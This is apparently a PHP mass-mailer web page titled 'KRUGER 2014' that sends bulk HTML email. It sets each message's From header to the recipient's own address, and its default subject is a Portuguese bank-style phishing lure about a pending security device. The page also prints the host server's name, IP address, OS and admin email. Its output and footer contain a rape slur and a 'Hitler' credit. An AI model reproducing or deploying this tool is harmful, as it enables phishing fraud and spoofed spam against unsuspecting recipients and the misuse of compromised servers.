<?php
$testa = $_POST['veio'];
if($testa != "") {
	$message = $_POST['html'];
	$subject = $_POST['assunto'];
	$nome = $_POST['nome'];
	$de = $_POST['de'];
	$to = $_POST['emails'];

	$email = explode("\n", $to);
	$message = stripslashes($message);

	$i = 0;
	$count = 1;
	while($email[$i]) {
    $dataHora = date("d/m/Y h:i:s");
	$boundary = rand(0,999999999999);
	$codig  = " - [ $boundary\n ]";
                 $EmailTemporario = $email[$i];
                 $message = stripslashes($message);
		$headers  = "MIME-Version: 1.0\n";
        $headers .= "Content-type: text/html; charset=iso-8859-1\n";
		$headers .= "From: ".$nome." <".$EmailTemporario.">\r\n";
			if(mail($EmailTemporario, $subject.$codig, $message.$dataHora, $headers))
		echo "<font color=Teal>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=black>[ + ] ESTUPRADO! ...</font><br><hr>";
		else
		echo "<font color=red>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=red>[ - ] Erro...</font><br><hr>";
		$i++;
		$count++;
	}
	$count--;
	echo "[Fim do Envio]";
	if($ok == "ok")
	echo "[Fim do Envio]";

}

?>


<HTML>
<head>
<title>// KRUGER 2014 //</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {  margin-left: 0;  margin-right: 0;  margin-top: 0;  margin-bottom: 0;}
.titulo { font-family: Arial, Helvetica, sans-serif; font-size: 70px; color: #000000; font-weight: bold;}
.normal {  font-family: "Courier New", Courier, monospace;  font-size: 14px;  color: #00F;}
.form {  font-family: Arial, Helvetica, sans-serif;  font-size: 10px;  color: #000000;  background-color: #0000FF;
  border: 1px dashed #666666;}
.texto {  font-family: Verdana, Arial, Helvetica, sans-serif;  font-weight: bold;}
.alerta {  font-family: Verdana, Arial, Helvetica, sans-serif;  font-weight: bold;  color: #000;  font-size: 10px;}
</style>
</head>
<BODY>
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">
  <table width="511" height="750" border="0" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC" class="normal">
    <tr>
      <td width="509" height="46" align="center" bgcolor="#000000"><p><strong>// KRUGER 2014 //</strong></p>
      <p>&nbsp;</p>
      <p>&nbsp;</p></td>
    </tr>
    <tr>
      <td height="194" valign="top" bgcolor="#FFFFFF">
      <table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="499">
      <tr>
            <td align="right" height="17"><span class="texto">Assunto:</span></td>
            <td height="17"><input name="assunto" type="text" value="Informamos que Seu Dispositivo de Seguranca Encontra-se Pendente. "class="normal" id="assunto" style="width:100%" ></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="20" colspan="2" bgcolor="#000000"><span class="texto">// C&oacute;digo HTML: //</span></td>
          </tr>
          <tr align="right">
            <td height="146" colspan="2" valign="top"><br>
             <textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="normal" id="html">
				teste
             </textarea>
             <span class="alerta"> HTML</span></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="47" colspan="2" bgcolor="#000000">// E-MAILS //<span class="texto"> </span></td>
          </tr>
          <tr align="right">
            <td height="136" colspan="2" valign="top"><br>
              <textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="normal" id="emails">carder22cc@gmail.com
carder22@hotmail.com</textarea>
              <marquee><span class="alerta">KRUGER 2014</span></marquee> </td>
          </tr>
          <tr>
            <td height="24" align="right" valign="top" colspan="2"><input type="submit" name="Submit" value="Enviar"></td>
          </tr>
        </table>
    </td>
    </tr>
    <tr>
      <tr align="left"> 
			<td colspan="2" bgcolor="#000000" >Nome do Servidor: <?php echo $UNAME = @php_uname(); ?><br>
				Endere&#231;o IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
				Sistema Operacional: <?php echo $OS = @PHP_OS; ?><br>
				Email admin: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
				Sistema por:Hitler - Spam Porra!
			</td>
    </tr>
  </table>
</form>
</body></html>
